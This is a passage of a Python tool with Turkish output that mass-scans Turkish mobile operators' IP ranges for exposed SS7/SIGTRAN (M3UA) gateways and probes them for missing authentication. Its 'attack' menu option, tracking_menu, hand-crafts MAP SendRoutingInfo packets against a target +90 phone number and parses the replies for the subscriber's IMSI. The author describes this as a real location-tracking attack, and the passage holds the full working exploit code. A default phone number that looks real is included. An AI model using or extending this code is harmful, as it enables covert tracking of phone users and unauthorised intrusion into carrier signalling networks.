                            'detay': 'ASP Active kabul edildi - kimlik dogrulama yok',
                            'risk': 'KRITIK',
                        })
                    else:
                        print(f"        \033[33m[~] {port}: ASP Active reddedildi (normal)\033[0m")
                else:
                    print(f"        \033[31m[-] {port}: ASP Up yanit yok\033[0m")
            except Exception as e:
                print(f"        \033[31m[-] {port}: {e}\033[0m")
            finally:
                if sock:
                    try: sock.close()
                    except Exception: pass

        # Test 4: Banner / Versiyon Toplama
        print("\n  [4/6] Banner Toplama...")
        for port in open_ports:
            sock = None
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                sock.connect((ip, port))

                # Çeşitli problar gönder
                probes = [
                    b'\r\n',
                    b'GET / HTTP/1.0\r\n\r\n',
                    b'\x00' * 4,
                ]
                for probe in probes:
                    try:
                        sock.send(probe)
                        banner = sock.recv(512)
                        if banner:
                            try:
                                text = banner.decode('utf-8', errors='ignore').strip()
                                if text and len(text) > 2:
                                    print(f"        {port}: Banner = '{text[:80]}'")
                                    target_report['zafiyetler'].append({
                                        'test': 'Banner',
                                        'port': port,
                                        'sonuc': 'BILGI',
                                        'detay': text[:200],
                                        'risk': 'DUSUK',
                                    })
                                    break
                            except Exception:
                                hex_b = ' '.join(f'{b:02x}' for b in banner[:16])
                                print(f"        {port}: Raw = {hex_b}")
                                break
                    except Exception:
                        continue
                else:
                    print(f"        {port}: Banner alinamadi")
            except Exception as e:
                print(f"        {port}: {e}")
            finally:
                if sock:
                    try: sock.close()
                    except Exception: pass

        # Test 5: SSL/TLS denemesi
        print("\n  [5/6] SSL/TLS Kontrolu...")
        for port in open_ports:
            sock = None
            ssock = None
            try:
                import ssl
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                sock.connect((ip, port))
                ssock = context.wrap_socket(sock, server_hostname=ip)
                cert = ssock.getpeercert(binary_form=True)
                print(f"        \033[33m{port}: SSL/TLS aktif (sertifika: {len(cert)} bytes)\033[0m")
                target_report['zafiyetler'].append({
                    'test': 'SSL/TLS',
                    'port': port,
                    'sonuc': 'BILGI',
                    'detay': f'SSL/TLS aktif, sertifika boyutu: {len(cert)}',
                    'risk': 'DUSUK',
                })
            except Exception:
                print(f"        {port}: SSL baglanti basarisiz")
            finally:
                if ssock:
                    try: ssock.close()
                    except Exception: pass
                elif sock:
                    try: sock.close()
                    except Exception: pass

        # Test 6: Baglanti suresi analizi
        print("\n  [6/6] Baglanti Suresi Analizi...")
        for port in open_ports:
            times = []
            for _ in range(3):
                sock = None
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(3)
                    start = time.time()
                    sock.connect((ip, port))
                    elapsed = (time.time() - start) * 1000
                    times.append(elapsed)
                except Exception:
                    pass
                finally:
                    if sock:
                        try: sock.close()
                        except Exception: pass
                time.sleep(0.1)

            if times:
                avg_ms = sum(times) / len(times)
                print(f"        {port}: Ort. yanit suresi = {avg_ms:.1f}ms ({len(times)}/3 basarili)")

        # Risk degerlendirmesi
        kritik = sum(1 for z in target_report['zafiyetler'] if z['risk'] == 'KRITIK')
        yuksek = sum(1 for z in target_report['zafiyetler'] if z['risk'] == 'YUKSEK')

        if kritik > 0:
            target_report['risk_seviyesi'] = 'KRITIK'
        elif yuksek > 0:
            target_report['risk_seviyesi'] = 'YUKSEK'
        elif len(open_ports) >= 2:
            target_report['risk_seviyesi'] = 'ORTA'
        else:
            target_report['risk_seviyesi'] = 'DUSUK'

        risk_color = {
            'KRITIK': '\033[31m', 'YUKSEK': '\033[33m',
            'ORTA': '\033[36m', 'DUSUK': '\033[37m',
        }
        color = risk_color.get(target_report['risk_seviyesi'], '')
        print(f"\n  -> Risk Seviyesi: {color}{target_report['risk_seviyesi']}\033[0m")

        report['hedefler'].append(target_report)

        # Dosyaya yaz
        with open(VULN_FILE, 'a', encoding='utf-8') as vf:
            vf.write(f"\n{'-' * 60}\n")
            vf.write(f"Hedef: {ip}\n")
            vf.write(f"Acik Portlar: {open_ports}\n")
            vf.write(f"Risk: {target_report['risk_seviyesi']}\n")
            for z in target_report['zafiyetler']:
                vf.write(f"  [{z['risk']}] {z['test']} ({z['port']}): {z['sonuc']} - {z['detay']}\n")

      except Exception as e:
        print(f"\n  \033[31m[-] Hedef {ip} test hatasi: {e}\033[0m")
        continue

    # JSON rapor
    json_file = VULN_FILE.replace('.txt', '.json')
    with open(json_file, 'w', encoding='utf-8') as jf:
        json.dump(report, jf, indent=2, ensure_ascii=False)

    # Genel ozet
    print("\n" + "=" * 60)
    print(" ZAFIYET TESTI TAMAMLANDI")
    print("=" * 60)

    total_vuln = sum(len(t['zafiyetler']) for t in report['hedefler'])
    kritik_total = sum(1 for t in report['hedefler'] for z in t['zafiyetler'] if z['risk'] == 'KRITIK')
    yuksek_total = sum(1 for t in report['hedefler'] for z in t['zafiyetler'] if z['risk'] == 'YUKSEK')

    print(f"  Hedef sayisi:     {len(report['hedefler'])}")
    print(f"  Toplam bulgu:     {total_vuln}")
    print(f"  \033[31mKritik:            {kritik_total}\033[0m")
    print(f"  \033[33mYuksek:            {yuksek_total}\033[0m")
    print(f"\n  Rapor (TXT):      {VULN_FILE}")
    print(f"  Rapor (JSON):     {json_file}")
    print("=" * 60)

    input("\nDevam etmek icin Enter'a basin...")


# ============================================
# HEDEF TAKİP
# ============================================

def _encode_tbcd(number):
    """Telefon numarasini TBCD (Telephony BCD) formatina cevir."""
    result = bytearray()
    # Numara tipi: 91 = international, 81 = national
    if number.startswith('9'):  # International (90...)
        result.append(0x91)
    else:
        result.append(0x81)
    digits = number
    for i in range(0, len(digits), 2):
        if i + 1 < len(digits):
            result.append(((int(digits[i+1]) & 0x0F) << 4) | (int(digits[i]) & 0x0F))
        else:
            result.append(0xF0 | (int(digits[i]) & 0x0F))
    return bytes(result)


def _build_sri_message(msisdn, opc=1, dpc=2):
    """MAP SendRoutingInfo mesaji olustur (M3UA + SCCP + TCAP + MAP)."""
    # 1) MAP SRI parametresi
    msisdn_bcd = _encode_tbcd(msisdn)
    # Context tag [0] MSISDN
    msisdn_tlv = bytes([0x80, len(msisdn_bcd)]) + msisdn_bcd

    # MAP Invoke: opcode=22 (SRI)
    # Invoke component
    opcode_enc = bytes([0x02, 0x01, 0x16])  # INTEGER opcode=22
    invoke_id_enc = bytes([0x02, 0x01, 0x01])  # invokeId=1
    param_seq = bytes([0x30, len(msisdn_tlv)]) + msisdn_tlv  # SEQUENCE
    invoke_content = invoke_id_enc + opcode_enc + param_seq
    invoke_comp = bytes([0xA1, len(invoke_content)]) + invoke_content

    # Component portion
    comp_portion = bytes([0x6C, len(invoke_comp)]) + invoke_comp

    # 2) TCAP Begin
    # Transaction ID
    otid = bytes([0x48, 0x04, 0x12, 0x34, 0x56, 0x78])
    # Dialogue portion (optional, skip for basic)
    tcap_content = otid + comp_portion
    tcap_begin = bytes([0x62, len(tcap_content)]) + tcap_content

    # 3) SCCP UDT (Unitdata)
    # Called party: SSN=6 (HLR)
    called_addr = bytes([0x03, 0xC4, 0x06])  # len=3, has SSN, route on SSN, SSN=6
    # Calling party: SSN=8 (MSC)
    calling_addr = bytes([0x03, 0xC4, 0x08])  # len=3, has SSN, route on SSN, SSN=8

    sccp_data = tcap_begin
    # UDT: msg_type=0x09, proto_class=0x00
    # pointer to called, pointer to calling, pointer to data
    ptr_called = 3
    ptr_calling = ptr_called + len(called_addr) + 1
    ptr_data = ptr_calling + len(calling_addr) + 1
    sccp_udt = bytes([0x09, 0x00, ptr_called, ptr_calling, ptr_data])
    sccp_udt += bytes([len(called_addr)]) + called_addr
    sccp_udt += bytes([len(calling_addr)]) + calling_addr
    sccp_udt += bytes([len(sccp_data)]) + sccp_data

    # 4) M3UA DATA message
    # Protocol Data parameter (tag=0x0210)
    pd_header = struct.pack('>I', (opc & 0xFFFFFF))  # OPC
    pd_header += struct.pack('>I', (dpc & 0xFFFFFF))  # DPC
    pd_header += bytes([0x03])  # SI = SCCP(3)
    pd_header += bytes([0x02])  # NI = National(2)
    pd_header += bytes([0x00])  # MP = 0
    pd_header += bytes([0x00])  # SLS = 0
    pd_payload = pd_header + sccp_udt

    # M3UA param: tag=0x0210, length
    param_len = 4 + len(pd_payload)  # tag(2) + len(2) + payload
    # Pad to 4-byte boundary
    pad_len = (4 - (param_len % 4)) % 4
    m3ua_param = struct.pack('>HH', 0x0210, param_len) + pd_payload + (b'\x00' * pad_len)

    # M3UA header: version=1, reserved=0, class=1(Transfer), type=1(DATA)
    m3ua_msg_len = 8 + len(m3ua_param)  # header(8) + params
    m3ua_header = struct.pack('>BBBBI', 0x01, 0x00, 0x01, 0x01, m3ua_msg_len)

    return m3ua_header + m3ua_param


def _build_m3ua_aspup():
    """M3UA ASP Up mesaji."""
    # Version=1, Reserved=0, Class=3 (ASPSM), Type=1 (ASP Up)
    return struct.pack('>BBBBI', 0x01, 0x00, 0x03, 0x01, 8)


def _build_m3ua_aspactive():
    """M3UA ASP Active mesaji."""
    # Version=1, Reserved=0, Class=4 (ASPTM), Type=1 (ASP Active)
    return struct.pack('>BBBBI', 0x01, 0x00, 0x04, 0x01, 8)


def _parse_m3ua_response(data):
    """M3UA yanitini cozumle."""
    if len(data) < 8:
        return None, "Yanit cok kisa"

    version = data[0]
    msg_class = data[2]
    msg_type = data[3]
    msg_len = struct.unpack('>I', data[4:8])[0]

    class_names = {0: 'MGMT', 1: 'Transfer', 2: 'SSNM', 3: 'ASPSM', 4: 'ASPTM'}
    class_name = class_names.get(msg_class, f'Unknown({msg_class})')

    if msg_class == 3:  # ASPSM
        type_names = {1: 'ASP Up', 2: 'ASP Down', 3: 'Heartbeat',
                      4: 'ASP Up Ack', 5: 'ASP Down Ack', 6: 'Heartbeat Ack'}
        type_name = type_names.get(msg_type, f'Unknown({msg_type})')
    elif msg_class == 4:  # ASPTM
        type_names = {1: 'ASP Active', 2: 'ASP Inactive',
                      3: 'ASP Active Ack', 4: 'ASP Inactive Ack'}
        type_name = type_names.get(msg_type, f'Unknown({msg_type})')
    elif msg_class == 1:  # Transfer
        type_name = 'DATA' if msg_type == 1 else f'Unknown({msg_type})'
    elif msg_class == 0:  # MGMT
        type_names = {0: 'Error', 1: 'Notify'}
        type_name = type_names.get(msg_type, f'Unknown({msg_type})')
    else:
        type_name = f'Type({msg_type})'

    info = {
        'class': msg_class, 'type': msg_type,
        'class_name': class_name, 'type_name': type_name,
        'length': msg_len, 'payload': data[8:msg_len] if msg_len > 8 else b'',
    }
    return info, f"{class_name}/{type_name} (len={msg_len})"


def _hexdump(data, prefix="    "):
    """Hex dump goster."""
    for i in range(0, min(len(data), 128), 16):
        hex_part = ' '.join(f'{b:02x}' for b in data[i:i+16])
        ascii_part = ''.join(chr(b) if 32 <= b < 127 else '.' for b in data[i:i+16])
        print(f"{prefix}{i:04x}: {hex_part:<48} {ascii_part}")
    if len(data) > 128:
        print(f"{prefix}... ({len(data)} byte toplam)")


def tracking_menu():
    """Turk numarasi ile SS7 konum takibi (gercek SRI saldirisi)."""
    print("\n" + "=" * 60)
    print(" SS7 HEDEF TAKIP - SendRoutingInfo (SRI)")
    print(" TCP uzerinden M3UA/SCCP/TCAP/MAP saldirisi")
    print("=" * 60)

    # Gateway sec
    gateway_ip = None
    gateway_candidates = []

    if os.path.exists(VERIFIED_FILE):
        print(f"\n[*] Onceki dogrulama sonuclari okunuyor...")
        try:
            with open(VERIFIED_FILE, "r", encoding='utf-8', errors='replace') as f:
                for line in f:
                    if "[VERIFIED]" in line or "[DO" in line or "[TCP" in line:
                        parts = line.split()
                        for p in parts:
                            if ":" in p and not p.startswith("["):
                                ip = p.split(":")[0]
                                port = p.split(":")[1].split()[0] if ":" in p else "2905"
                                try:
                                    ipaddress.ip_address(ip)
                                    port_val = int(port)
                                    if 1 <= port_val <= 65535:
                                        if ip not in [c[0] for c in gateway_candidates]:
                                            gateway_candidates.append((ip, str(port_val)))
                                except ValueError:
                                    pass
        except (IOError, OSError):
            pass

    if gateway_candidates:
        print(f"\n[*] {len(gateway_candidates)} gateway bulundu:")
        for i, (ip, port) in enumerate(gateway_candidates[:10]):
            print(f"    {i}) {ip}:{port}")
        sel = input(f"\n[?] Gateway sec (0-{min(len(gateway_candidates),10)-1}) veya IP gir: ") or "0"
        try:
            idx = int(sel)
            if 0 <= idx < len(gateway_candidates):
                gateway_ip, gw_port = gateway_candidates[idx]
            else:
                gateway_ip = sel
                gw_port = "2905"
        except ValueError:
            gateway_ip = sel
            gw_port = "2905"
    else:
        gateway_ip = _prompt_ip("[*] SS7 Gateway IP")
        gw_port = "2905"

    if gateway_ip:
        try:
            ipaddress.ip_address(gateway_ip)
        except ValueError:
            gateway_ip = _prompt_ip("[*] SS7 Gateway IP")

    gateway_port = _prompt_int("[*] Gateway Port", int(gw_port), min_value=1, max_value=65535)
    msisdn = _prompt_msisdn("\n[*] Telefon Numarasi (orn: 5536403424)", "905536403424")

    opc = _prompt_int("[*] OPC (Originating Point Code)", 1, min_value=0, max_value=16383)
    dpc = _prompt_int("[*] DPC (Destination Point Code)", 2, min_value=0, max_value=16383)

    print(f"\n{'=' * 60}")
    print(f" Hedef MSISDN:  +{msisdn}")
    print(f" Gateway:       {gateway_ip}:{gateway_port}")
    print(f" OPC/DPC:       {opc}/{dpc}")
    print(f"{'=' * 60}")

    if not _prompt_yes_no("\n[?] Saldiriyi baslat? (e/h)", "e"):
        return

    sock = None
    try:
        # Adim 1: TCP Baglantisi
        print(f"\n[1/5] TCP baglantisi kuruluyor -> {gateway_ip}:{gateway_port}")
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(8)
        sock.connect((gateway_ip, int(gateway_port)))
        print(f"      \033[32m[+] TCP baglanti basarili!\033[0m")

        # Adim 2: M3UA ASP Up
        print(f"\n[2/5] M3UA ASP Up gonderiliyor...")
        aspup_msg = _build_m3ua_aspup()
        print(f"      Gonderilen ({len(aspup_msg)} byte):")
        _hexdump(aspup_msg, "      ")
        sock.send(aspup_msg)

        try:
            resp1 = sock.recv(4096)
            if resp1:
                info1, desc1 = _parse_m3ua_response(resp1)
                print(f"      \033[32m[+] Yanit: {desc1}\033[0m")
                _hexdump(resp1, "      ")

                if info1 and info1['class'] == 3 and info1['type'] == 4:
                    print(f"      \033[32m[+] ASP Up Ack alindi!\033[0m")
                elif info1 and info1['class'] == 0:
                    print(f"      \033[33m[!] MGMT yaniti (Error/Notify)\033[0m")
                else:
                    print(f"      \033[33m[!] Beklenmeyen yanit, devam ediliyor...\033[0m")
            else:
                print(f"      \033[33m[!] Bos yanit, devam ediliyor...\033[0m")
        except socket.timeout:
            print(f"      \033[33m[!] ASP Up yanit yok (timeout), devam ediliyor...\033[0m")

        # Adim 3: M3UA ASP Active
        print(f"\n[3/5] M3UA ASP Active gonderiliyor...")
        aspactive_msg = _build_m3ua_aspactive()
        print(f"      Gonderilen ({len(aspactive_msg)} byte):")
        _hexdump(aspactive_msg, "      ")
        sock.send(aspactive_msg)

        asp_active_ok = False
        try:
            resp2 = sock.recv(4096)
            if resp2:
                info2, desc2 = _parse_m3ua_response(resp2)
                print(f"      \033[32m[+] Yanit: {desc2}\033[0m")
                _hexdump(resp2, "      ")

                if info2 and info2['class'] == 4 and info2['type'] == 3:
                    print(f"      \033[32m[+] ASP Active Ack! Kimlik dogrulama ATLANMIS!\033[0m")
                    asp_active_ok = True
                elif info2 and info2['class'] == 0 and info2['type'] == 0:
                    print(f"      \033[31m[-] M3UA Error - ASP Active reddedildi\033[0m")
                    # Yine de MAP mesaji gondermeyi dene
                else:
                    print(f"      \033[33m[!] Beklenmeyen yanit\033[0m")
            else:
                print(f"      \033[33m[!] Bos yanit\033[0m")
        except socket.timeout:
            print(f"      \033[33m[!] ASP Active yanit yok (timeout)\033[0m")

        # Adim 4: MAP SRI Mesaji
        print(f"\n[4/5] MAP SendRoutingInfo gonderiliyor...")
        print(f"      MSISDN: +{msisdn}")
        print(f"      OpCode: 22 (SRI)")

        sri_msg = _build_sri_message(msisdn, opc, dpc)
        print(f"      M3UA/SCCP/TCAP/MAP paketi ({len(sri_msg)} byte):")
        _hexdump(sri_msg, "      ")
        sock.send(sri_msg)

        # Adim 5: Yanit Analizi
        print(f"\n[5/5] Yanit bekleniyor...")
        try:
            resp3 = sock.recv(8192)
            if resp3:
                print(f"      \033[32m[+] {len(resp3)} byte yanit alindi!\033[0m")
                _hexdump(resp3, "      ")

                info3, desc3 = _parse_m3ua_response(resp3)
                print(f"      M3UA: {desc3}")

                if info3 and info3['class'] == 1 and info3['payload']:
                    # DATA mesaji - SCCP/TCAP/MAP yaniti iceriyor olabilir
                    payload = info3['payload']
                    print(f"\n      \033[32m[+] M3UA DATA yaniti alindi!\033[0m")
                    print(f"      Payload ({len(payload)} byte):")
                    _hexdump(payload, "      ")

                    # TCAP yaniti ayrıstir
                    _parse_tcap_response(payload)

                elif info3 and info3['class'] == 0:
                    print(f"\n      \033[31m[-] M3UA Error mesaji\033[0m")
                    if info3['payload']:
                        # Error code
                        if len(info3['payload']) >= 8:
                            err_tag = struct.unpack('>HH', info3['payload'][:4])
                            if err_tag[0] == 0x000C:  # Error Code param
                                err_code = struct.unpack('>I', info3['payload'][4:8])[0]
                                err_names = {
                                    0x01: 'Invalid Version',
                                    0x03: 'Unsupported Message Class',
                                    0x04: 'Unsupported Message Type',
                                    0x07: 'Unexpected Message',
                                    0x0D: 'Refused - Management Blocking',
                                    0x11: 'ASP ID Required',
                                    0x12: 'Invalid ASP ID',
                                }
                                print(f"      Error Code: 0x{err_code:04x} ({err_names.get(err_code, 'Unknown')})")
                else:
                    print(f"\n      \033[33m[!] Yanit MAP verisi icermiyor\033[0m")
            else:
                print(f"      \033[31m[-] Bos yanit\033[0m")
        except socket.timeout:
            print(f"      \033[31m[-] MAP yanit yok (timeout - 8sn)\033[0m")
            print(f"      Gateway muhtemelen SS7 firewall ile korunuyor.")

    except socket.timeout:
        print(f"\033[31m[-] Baglanti zaman asimi.\033[0m")
    except ConnectionRefusedError:
        print(f"\033[31m[-] Baglanti reddedildi.\033[0m")
    except ConnectionResetError:
        print(f"\033[31m[-] Baglanti sifirlandi (gateway baglanti kopardi).\033[0m")
    except Exception as e:
        print(f"\033[31m[-] Hata: {e}\033[0m")
        import traceback
        traceback.print_exc()
    finally:
        if sock:
            try: sock.close()
            except Exception: pass

    # Sonuc ozeti
    print(f"\n{'=' * 60}")
    print(f" SS7 SRI SALDIRI SONUCU")
    print(f"{'=' * 60}")
    print(f"  Hedef:    +{msisdn}")
    print(f"  Gateway:  {gateway_ip}:{gateway_port}")
    print(f"  Not:      Eger yanit alinamazsa firewall aktif demektir.")
    print(f"  Oneri:    Farkli gateway/port deneyin veya SS7 menusunu kullanin.")
    print(f"{'=' * 60}")

    input("\nDevam etmek icin Enter'a basin...")


def _parse_tcap_response(data):
    """SCCP/TCAP yanitini cozumle."""
    try:
        # SCCP UDT kontrolu - ilk 12 byte'dan sonra SCCP
        # M3UA Protocol Data parameter'i icinde
        # OPC(4) + DPC(4) + SI(1) + NI(1) + MP(1) + SLS(1) = 12 byte
        offset = 0
        if len(data) > 12:
            si = data[8] if len(data) > 8 else 0
            if si == 3:  # SCCP
                offset = 12  # Skip M3UA Proto Data header
                print(f"      SCCP mesaji tespit edildi (offset={offset})")

        # TCAP tag kontrolu
        search_data = data[offset:]
        for i in range(len(search_data)):
            tag = search_data[i]
            if tag in (0x64, 0x65, 0x67):  # TCAP End, Continue, Abort
                tag_names = {0x64: 'TCAP End', 0x65: 'TCAP Continue', 0x67: 'TCAP Abort'}
                print(f"      \033[32m[+] {tag_names.get(tag, 'TCAP')} tespit edildi!\033[0m")

                # Yanit icerigini goster
                if tag == 0x64:  # End - genellikle basarili yanit
                    print(f"      \033[32m[+] SRI yaniti basarili olabilir!\033[0m")
                    # Component portion icerigini ara
                    for j in range(i, min(i+100, len(search_data))):
                        if search_data[j] == 0x6C:  # Component portion
                            print(f"      Component portion bulundu (offset={j})")
                            comp_data = search_data[j:]
                            _hexdump(comp_data[:64], "      ")
                            break
                elif tag == 0x67:  # Abort
                    print(f"      \033[31m[-] TCAP Abort - istek reddedildi\033[0m")
                break

        # IMSI arast - TBCD formatinda 8 byte
        for i in range(len(data) - 7):
            # IMSI genellikle 0x04 (OCTET STRING) tag'i ile gelir
            if data[i] == 0x04 and data[i+1] in range(6, 10):
                possible_imsi = data[i+2:i+2+data[i+1]]
                # TBCD decode dene
                imsi_digits = ''
                for b in possible_imsi:
                    low = b & 0x0F
                    high = (b >> 4) & 0x0F
                    if low < 10:
                        imsi_digits += str(low)
                    if high < 10 and high != 0x0F:
                        imsi_digits += str(high)
                if len(imsi_digits) >= 14 and imsi_digits.isdigit():
                    print(f"      \033[32m[+] Muhtemel IMSI: {imsi_digits}\033[0m")

    except Exception as e:
        print(f"      TCAP parse hatasi: {e}")


# ============================================
# ANA MENÜ
# ============================================

def main():
    """Türkiye tarayıcı ana menü."""
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        banner()

        isp_list = list(TR_SUBNETS.keys())
        print("  Operatorler:")
        for i, isp in enumerate(isp_list):
            subnet_count = len(TR_SUBNETS[isp])
            print(f"    {i}) {isp} ({subnet_count} subnet)")

        print()
        print("  +-------------------------------------------+")
        print("  |  TARAMA                                   |")
        print("  |  1) Hizli Tarama (1000 IP, port 2905)     |")
        print("  |  2) Tam Tarama (tum IP, port 2905)        |")
        print("  |  3) Derin Tarama (tum IP, tum portlar)    |")
        print("  |  4) Ozel Tarama (operator sec)            |")
        print("  |                                           |")
        print("  |  ANALIZ                                   |")
        print("  |  5) Sonuclari Goruntule                   |")
        print("  |  6) Sonuc Dogrulama (M3UA Probu)          |")
        print("  |  7) Zafiyet Testi (Guvenlik Analizi)      |")
        print("  |                                           |")
        print("  |  SALDIRI                                  |")
        print("  |  8) Hedef Takip (+90 numara)              |")
        print("  |                                           |")
        print("  |  99) Geri                                 |")
        print("  +-------------------------------------------+")

        choice = input("\n\033[34mtr\033[0m\033[37m>\033[0m ").strip().lower()

        if choice == "1":
            scan_tr_gateways(ips_per_subnet=1000, scan_ports=[2905])
        elif choice == "2":
            total_s = sum(len(v) for v in TR_SUBNETS.values())
            print(f"\033[33m[!] Tam tarama: Her subnet'te 65534 IP taranacak.\033[0m")
            print(f"[!] Toplam subnet: {total_s}")
            if _prompt_yes_no("[?] Devam? (e/h)", "h"):
                scan_tr_gateways(scan_ports=[2905])
        elif choice == "3":
            print(f"\033[33m[!] Derin tarama: Tum IP + tum SIGTRAN portlari.\033[0m")
            print(f"[!] Portlar: {list(SIGTRAN_PORTS.keys())}")
            if _prompt_yes_no("[?] Devam? (e/h)", "h"):
                scan_tr_gateways(scan_ports=list(SIGTRAN_PORTS.keys()))
        elif choice == "4":
            print("\nOperator secin (virgulle ayirin, orn: 0,1,3):")
            for i, isp in enumerate(isp_list):
                print(f"  {i}) {isp}")
            sel = get_input("\nSecim", "")
            selected = []
            try:
                for idx_s in sel.split(","):
                    idx_i = int(idx_s.strip())
                    if 0 <= idx_i < len(isp_list):
                        selected.append(isp_list[idx_i])
            except ValueError:
                print("[-] Gecersiz secim")
                time.sleep(1)
                continue
            if not selected:
                print("[-] Operator secilmedi")
                time.sleep(1)
                continue
            ips_input = _prompt_int("Subnet basina IP (0=tumu)", 1000, min_value=0, max_value=65534)
            scan_tr_gateways(selected_isps=selected, ips_per_subnet=ips_input)
        elif choice == "5":
            if os.path.exists(OUTPUT_FILE):
                print(f"\n[*] {OUTPUT_FILE} icerigi:\n")
                with open(OUTPUT_FILE, "r", encoding='utf-8', errors='replace') as f:
                    print(f.read())
            else:
                print("\n[-] Sonuc dosyasi bulunamadi.")
            if os.path.exists(VERIFIED_FILE):
                print(f"\n[*] {VERIFIED_FILE} icerigi:\n")
                with open(VERIFIED_FILE, "r", encoding='utf-8', errors='replace') as f:
                    print(f.read())
            if os.path.exists(VULN_FILE):
                print(f"\n[*] {VULN_FILE} icerigi:\n")
                with open(VULN_FILE, "r", encoding='utf-8', errors='replace') as f:
                    print(f.read())
            input("\nDevam etmek icin Enter'a basin...")
        elif choice == "6":
            try:
                verify_results()
            except Exception as e:
                print(f"\033[31m[-] Dogrulama hatasi: {e}\033[0m")
                import traceback
                traceback.print_exc()
                input("\nDevam etmek icin Enter'a basin...")
        elif choice == "7":
            try:
                vulnerability_test()
            except Exception as e:
                print(f"\033[31m[-] Zafiyet testi hatasi: {e}\033[0m")
                import traceback
                traceback.print_exc()
                input("\nDevam etmek icin Enter'a basin...")
        elif choice == "8":
            tracking_menu()
        elif choice == "99":
            break
        else:
            print('\033[31m[-] Hata:\033[0m Gecersiz secim')
            time.sleep(1)


if __name__ == "__main__":
    main()
